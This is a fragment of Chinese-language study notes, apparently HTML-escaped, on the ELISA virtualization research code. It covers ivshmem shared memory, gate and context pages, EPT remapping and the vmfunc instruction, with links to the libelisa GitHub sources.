href=\"https://blog.csdn.net/stray2b/article/details/128896078\">qemu-kvm Hypervisor：ivshmem-CSDN博客</a></p>\n<p>managerVM可以知道共享内存的地址  然后建立和guest sub的共享 达到guest def&lt;&#x3D;&gt;manager def&lt;&#x3D;&gt;guest sub共享的效果</p>\n<p>gate_entry_page有三个连续的page</p>\n<p>gate_ctx_page和sub_ctx_page共4个连续的page</p>\n<p>这些page代码通过VM kernel加载以后 放到host真实的物理内存中</p>\n<p>随后通过修改EPT 改变了guest眼中的内存布局(例如物理内存中gate_ctx_page-&gt;eptp_list-&gt;sub_ctx_pape但是GPA视角gate_ctx_page-&gt;eptp_list-&gt;stack)</p>\n<p>guest vm 用户态代码<a href=\"https://github.com/yasukata/elisa-app-nop/blob/master/main.c\">elisa-app-nop&#x2F;main.c at master · yasukata&#x2F;elisa-app-nop (github.com)</a> 其中elisa__client_work调用elisa_gate_entry</p>\n<p><a href=\"https://github.com/yasukata/elisa-util-exec/blob/master/main.c\">elisa-util-exec&#x2F;main.c at master · yasukata&#x2F;elisa-util-exec (github.com)</a></p>\n<p><a href=\"https://github.com/yasukata/libelisa/blob/master/client.c\">libelisa&#x2F;client.c at master · yasukata&#x2F;libelisa (github.com)</a> ____asm_impl_client 定义了elisa_gate_entry 用到vmfunc 执行这行以后去哪了？</p>\n<p><a href=\"https://github.com/yasukata/libelisa/blob/master/server.c#L43\">libelisa&#x2F;server.c at master · yasukata&#x2F;libelisa (github.com)</a>对应了论文中gate entry的header</p>\n<p>vmfunc理论上是某个page的最后一个指令 因此non-default EPT不会再映射开始的vmfunc这个page</p>\n"}]